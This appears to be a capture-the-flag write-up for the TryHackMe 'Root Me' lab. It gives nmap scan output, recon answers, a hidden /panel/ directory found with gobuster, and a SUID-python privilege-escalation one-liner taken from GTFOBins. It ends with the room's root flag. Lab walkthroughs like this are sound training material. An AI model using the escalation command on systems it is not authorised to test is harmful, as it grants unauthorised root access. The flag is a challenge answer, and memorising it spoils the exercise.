# Root Me

```
export ip=10.10.253.93
``` 

##Nmap Scan

# Nmap 7.91 scan initiated Wed Jan 27 15:43:38 2021 as: nmap -sC -sV -A -O -oN initial 10.10.253.93
Nmap scan report for 10.10.253.93
Host is up (0.064s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   59.74 ms 10.9.0.1
2   59.06 ms 10.10.253.93

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 27 15:44:04 2021 -- 1 IP address (1 host up) scanned in 25.67 seconds


## Recon

### How many ports are open?

####With **nmap**
```
2 - 22 & 80
```

### What Apache version is running?

####With **nmap**
```
2.4.29
```

### What service is running on port 22?

####With **nmap**
```
ssh
```

### What is the hidden directory?

#### With **gobuster**
```
/panel/
```

## Getting a shell

###user.txt
```

```

## Priv esc

### Which SUID permission file is weird?
```
/usr/bin/python
```

### root.txt

#### website **gtfobins.github.io**
#### command **./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
**

```
THM{pr1v1l3g3_3sc4l4t10n}
```